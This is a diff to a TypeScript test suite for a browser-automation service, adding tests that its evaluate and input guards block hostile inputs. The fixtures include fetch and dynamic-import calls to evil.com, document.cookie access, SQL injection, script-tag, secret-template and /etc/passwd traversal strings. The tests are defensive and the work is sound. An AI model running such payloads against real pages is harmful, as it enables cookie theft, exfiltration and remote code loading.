@@ -9,8 +9,7 @@ import { MCPToolResult } from "../../MCP/types";
 // ---------------------------------------------------------------------------
 
 function resetSingleton(): void {
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  (BrowserService as any).instance = null;
+  BrowserService.dispose();
 }
 
 function successResult(text: string): MCPToolResult {
@@ -65,13 +64,17 @@ suite("BrowserService", () => {
   // ── navigate ────────────────────────────────────────────────────────
 
   test("navigate calls MCP with validated URL", async () => {
-    callToolStub.resolves(successResult("Navigated to https://example.com/"));
+    // First call: browser_navigate, second call: post-nav hostname check
+    callToolStub
+      .onFirstCall()
+      .resolves(successResult("Navigated to https://example.com/"))
+      .onSecondCall()
+      .resolves(successResult("example.com"));
     const svc = BrowserService.getInstance();
     const result = await svc.navigate("https://example.com");
 
     assert.ok(result.success);
     assert.ok(result.content.includes("example.com"));
-    assert.ok(callToolStub.calledOnce);
     assert.strictEqual(callToolStub.firstCall.args[0], "browser_navigate");
     assert.strictEqual(callToolStub.firstCall.args[2], "playwright");
   });
@@ -306,11 +309,103 @@ suite("BrowserService", () => {
     assert.ok(callToolStub.notCalled);
   });
 
-  // ── singleton ───────────────────────────────────────────────────────
+  // ── evaluate content guards ────────────────────────────────────────
+
+  test("evaluate blocks fetch() calls", async () => {
+    const svc = BrowserService.getInstance();
+    const result = await svc.evaluate("fetch('https://evil.com')");
+    assert.strictEqual(result.success, false);
+    assert.ok(result.content.includes("blocked pattern"));
+    assert.ok(callToolStub.notCalled);
+  });
+
+  test("evaluate blocks XMLHttpRequest", async () => {
+    const svc = BrowserService.getInstance();
+    const result = await svc.evaluate("new XMLHttpRequest()");
+    assert.strictEqual(result.success, false);
+    assert.ok(result.content.includes("blocked pattern"));
+    assert.ok(callToolStub.notCalled);
+  });
+
+  test("evaluate blocks document.cookie", async () => {
+    const svc = BrowserService.getInstance();
+    const result = await svc.evaluate("document.cookie");
+    assert.strictEqual(result.success, false);
+    assert.ok(result.content.includes("blocked pattern"));
+  });
+
+  test("evaluate blocks dynamic import()", async () => {
+    const svc = BrowserService.getInstance();
+    const result = await svc.evaluate("import('https://evil.com/payload.js')");
+    assert.strictEqual(result.success, false);
+    assert.ok(result.content.includes("blocked pattern"));
+  });
+
+  test("evaluate allows safe expressions", async () => {
+    callToolStub.resolves(successResult("42"));
+    const svc = BrowserService.getInstance();
+    const result = await svc.evaluate("document.title");
+    assert.ok(result.success);
+    assert.strictEqual(result.content, "42");
+  });
+
+  // ── input guard on ref/key ──────────────────────────────────────────
+
+  test("click rejects malicious ref", async () => {
+    const svc = BrowserService.getInstance();
+    await assert.rejects(
+      () => svc.click("'; DROP TABLE users; --"),
+      /Invalid ref parameter/,
+    );
+    assert.ok(callToolStub.notCalled);
+  });
+
+  test("type rejects malicious ref", async () => {
+    const svc = BrowserService.getInstance();
+    await assert.rejects(
+      () => svc.type("<script>alert(1)</script>", "text"),
+      /Invalid ref parameter/,
+    );
+    assert.ok(callToolStub.notCalled);
+  });
+
+  test("hover rejects malicious ref", async () => {
+    const svc = BrowserService.getInstance();
+    await assert.rejects(
+      () => svc.hover("${process.env.SECRET}"),
+      /Invalid ref parameter/,
+    );
+  });
+
+  test("pressKey rejects invalid key", async () => {
+    const svc = BrowserService.getInstance();
+    await assert.rejects(
+      () => svc.pressKey("A".repeat(100)),
+      /Invalid key parameter/,
+    );
+    assert.ok(callToolStub.notCalled);
+  });
+
+  test("selectOption rejects malicious ref", async () => {
+    const svc = BrowserService.getInstance();
+    await assert.rejects(
+      () => svc.selectOption("../../etc/passwd", "val"),
+      /Invalid ref parameter/,
+    );
+  });
+
+  // ── singleton & dispose ─────────────────────────────────────────────
 
   test("getInstance returns same instance", () => {
     const a = BrowserService.getInstance();
     const b = BrowserService.getInstance();
     assert.strictEqual(a, b);
+  });
+
+  test("dispose resets singleton", () => {
+    const a = BrowserService.getInstance();
+    BrowserService.dispose();
+    const b = BrowserService.getInstance();
+    assert.notStrictEqual(a, b);
   });
 });
